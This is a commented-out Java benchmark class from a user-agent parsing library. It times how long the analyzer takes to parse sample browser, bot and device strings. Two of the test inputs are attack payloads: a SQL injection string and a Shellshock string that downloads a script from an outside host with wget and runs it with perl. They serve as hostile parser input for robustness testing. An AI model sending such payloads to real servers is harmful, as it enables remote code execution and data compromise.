///*
// * Yet Another UserAgent Analyzer
// * Copyright (C) 2013-2019 Niels Basjes
// *
// * Licensed under the Apache License, Version 2.0 (the "License");
// * you may not use this file except in compliance with the License.
// * You may obtain a copy of the License at
// *
// * https://www.apache.org/licenses/LICENSE-2.0
// *
// * Unless required by applicable law or agreed to in writing, software
// * distributed under the License is distributed on an "AS IS" BASIS,
// * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// * See the License for the specific language governing permissions and
// * limitations under the License.
// */
//
//package nl.basjes.parse.useragent.benchmarks;
//
//import nl.basjes.parse.useragent.UserAgent;
//import nl.basjes.parse.useragent.UserAgentAnalyzer;
//import nl.basjes.statistics.Counter;
//import org.apache.commons.lang3.tuple.Triple;
//import org.slf4j.Logger;
//import org.slf4j.LoggerFactory;
//
//import java.util.ArrayList;
//import java.util.List;
//import java.util.function.Function;
//
//public class AlternativeAnalyzerBenchmarks {
//
//    private static final Logger            LOG = LoggerFactory.getLogger(AlternativeAnalyzerBenchmarks.class);
//    private              UserAgentAnalyzer uaa;
//
//    public AlternativeAnalyzerBenchmarks() {
//        uaa = UserAgentAnalyzer.newBuilder()
//            .withoutCache()
//            .hideMatcherLoadStats()
//            .keepTests()
//            .build();
//    }
//
//    public void run() {
//        List<Triple<Counter, String, Function<AlternativeAnalyzerBenchmarks, UserAgent>>> testCases = new ArrayList<>();
//
//        testCases.add(Triple.of(new Counter(), "android6Chrome46",        this::android6Chrome46));
//        testCases.add(Triple.of(new Counter(), "androidPhone",            this::androidPhone));
//        testCases.add(Triple.of(new Counter(), "googlebot",               this::googlebot));
//        testCases.add(Triple.of(new Counter(), "googleBotMobileAndroid",  this::googleBotMobileAndroid));
//        testCases.add(Triple.of(new Counter(), "googleAdsBot",            this::googleAdsBot));
//        testCases.add(Triple.of(new Counter(), "googleAdsBotMobile",      this::googleAdsBotMobile));
//        testCases.add(Triple.of(new Counter(), "iPhone",                  this::iPhone));
//        testCases.add(Triple.of(new Counter(), "iPhoneFacebookApp",       this::iPhoneFacebookApp));
//        testCases.add(Triple.of(new Counter(), "iPad",                    this::iPad));
//        testCases.add(Triple.of(new Counter(), "win7ie11",                this::win7ie11));
//        testCases.add(Triple.of(new Counter(), "win10Edge13",             this::win10Edge13));
//        testCases.add(Triple.of(new Counter(), "win10Chrome51",           this::win10Chrome51));
//        testCases.add(Triple.of(new Counter(), "win10IE11",               this::win10IE11));
//        testCases.add(Triple.of(new Counter(), "hackerSQL",               this::hackerSQL));
//        testCases.add(Triple.of(new Counter(), "hackerShellShock",        this::hackerShellShock));
//
//        uaa.preHeat(2000, true);
////        uaa.preHeat(1, true);
//
//        for (int run = 0; run < 10; run++) {
//            testCases.forEach(this::doTest);
//        }
//
//        testCases.forEach(this::printResults);
//
//    }
//
//    private void doTest(Triple<Counter, String, Function<AlternativeAnalyzerBenchmarks, UserAgent>> test) {
//
//        Function<AlternativeAnalyzerBenchmarks, UserAgent> function = test.getRight();
//        long start = System.nanoTime();
//        UserAgent agent = function.apply(this);
//        long stop = System.nanoTime();
//        if(agent.getValue("DeviceClass") == null) {
//            LOG.error("This should not happen");
//        }
//
//        test.getLeft().increment((double)(stop - start));
//    }
//
//    private void printResults(Triple<Counter, String, Function<AlternativeAnalyzerBenchmarks, UserAgent>> test) {
//        double mean = test.getLeft().getMean();
////        String meanNs = String.format("%10.0f", mean);
//        String meanMs = String.format("%5.4f", mean/1000000);
//        LOG.info("Test average speed: {} ms: {}",
//            meanMs, test.getMiddle());
//    }
//
//
//    public UserAgent android6Chrome46(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) " +
//            "Chrome/46.0.2490.76 Mobile Safari/537.36");
//    }
//
//
//    public UserAgent androidPhone(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) " +
//            "Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36");
//    }
//
//
//    public UserAgent googlebot(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
//    }
//
//
//    public UserAgent googleBotMobileAndroid(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) " +
//            "Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
//    }
//
//
//    public UserAgent googleAdsBot(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("AdsBot-Google (+http://www.google.com/adsbot.html)");
//    }
//
//
//    public UserAgent googleAdsBotMobile(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
//            "Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)");
//    }
//
//
//    public UserAgent iPhone(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
//            "Version/9.0 Mobile/13F69 Safari/601.1");
//    }
//
//
//    public UserAgent iPhoneFacebookApp(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
//            "Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;" +
//            "FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]");
//    }
//
//
//    public UserAgent iPad(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
//            "Version/9.0 Mobile/13F69 Safari/601.1");
//    }
//
//
//    public UserAgent win7ie11(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
//    }
//
//
//    public UserAgent win10Edge13(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
//            "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
//    }
//
//
//    public UserAgent win10Chrome51(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) " +
//            "Chrome/51.0.2704.103 Safari/537.36");
//    }
//
//
//    public UserAgent win10IE11(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
//    }
//
//
//    public UserAgent hackerSQL(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT " +
//            "(CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283");
//    }
//
//
//    public UserAgent hackerShellShock(AlternativeAnalyzerBenchmarks state) {
//        return state.uaa.parse("() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\"");
//    }
//}
